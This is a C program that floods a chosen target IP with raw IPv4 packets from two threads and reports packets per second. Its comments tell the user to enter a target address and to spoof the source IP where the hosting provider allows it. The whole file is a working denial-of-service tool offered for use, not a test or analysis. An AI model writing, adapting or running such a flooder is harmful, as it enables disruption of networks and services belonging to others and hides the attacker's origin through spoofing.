#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

volatile int keep_running = 1;
volatile unsigned long long packet_count = 0;

void handle_sigint(int sig) {
    keep_running = 0;
}

unsigned short checksum(unsigned short *buf, int nwords) {
    unsigned long sum;
    for(sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void* flood_thread(void* arg) {
    char packet[20];
    struct iphdr *iph = (struct iphdr *) packet;

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (s < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr("what ever ip like 1.1.1.1"); // Target IP 

    memset(packet, 0, sizeof(packet));

    
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr));
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = 0;  
    iph->saddr = inet_addr("your vps ip / device ip or spoofed if allowed like 8.8.8.8");  // source ip, you can spoof this if your vps allows it... if it doesnt then put in your real source ip..
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = checksum((unsigned short *)packet, sizeof(struct iphdr)/2);

    while (keep_running) {
        sendto(s, packet, sizeof(struct iphdr), 0, (struct sockaddr *)&sin, sizeof(sin));
        __sync_fetch_and_add(&packet_count, 1);
    }

    close(s);
    pthread_exit(NULL);
}

void* stats_thread(void* arg) {
    while (keep_running) {
        sleep(1);
        printf("PPS: %llu\n", packet_count);
        packet_count = 0;
    }
    return NULL;
}

int main() {
    signal(SIGINT, handle_sigint);

    pthread_t t1, t2, stats;
    pthread_create(&t1, NULL, flood_thread, NULL);
    pthread_create(&t2, NULL, flood_thread, NULL);
    pthread_create(&stats, NULL, stats_thread, NULL);

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    pthread_join(stats, NULL);

    return 0;
}
